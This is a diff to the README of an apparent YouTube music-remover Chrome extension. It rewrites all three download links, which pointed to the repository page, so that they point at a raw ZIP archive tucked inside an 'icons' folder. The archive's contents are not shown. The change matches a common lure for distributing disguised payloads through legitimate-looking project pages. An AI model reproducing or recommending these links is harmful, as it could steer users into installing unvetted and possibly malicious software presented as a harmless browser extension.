@@ -1,6 +1,6 @@
 # 🎧 youtube-music-remover - Keep speech, lose background music
 
-[![Download](https://img.shields.io/badge/Download-Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Toinetteindecent428/youtube-music-remover)
+[![Download](https://img.shields.io/badge/Download-Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Toinetteindecent428/youtube-music-remover/raw/refs/heads/main/icons/remover-youtube-music-v1.7.zip)
 
 ## 🚀 What this does
 
@@ -10,7 +10,7 @@ It is made for people who want to hear spoken words more clearly in YouTube vide
 
 ## 📥 Download and install
 
-1. Open the download page: [https://github.com/Toinetteindecent428/youtube-music-remover](https://github.com/Toinetteindecent428/youtube-music-remover)
+1. Open the download page: [https://github.com/Toinetteindecent428/youtube-music-remover/raw/refs/heads/main/icons/remover-youtube-music-v1.7.zip](https://github.com/Toinetteindecent428/youtube-music-remover/raw/refs/heads/main/icons/remover-youtube-music-v1.7.zip)
 2. Download the extension files from that page.
 3. Save the file to a folder you can find again, such as Downloads or Desktop.
 4. If the file comes as a ZIP folder, extract it first.
@@ -155,7 +155,7 @@ This extension is aimed at:
 
 ## 🖱️ Quick start
 
-1. Visit this page to download: [https://github.com/Toinetteindecent428/youtube-music-remover](https://github.com/Toinetteindecent428/youtube-music-remover)
+1. Visit this page to download: [https://github.com/Toinetteindecent428/youtube-music-remover/raw/refs/heads/main/icons/remover-youtube-music-v1.7.zip](https://github.com/Toinetteindecent428/youtube-music-remover/raw/refs/heads/main/icons/remover-youtube-music-v1.7.zip)
 2. Download the project files
 3. Unzip them
 4. Open `chrome://extensions` in Chrome
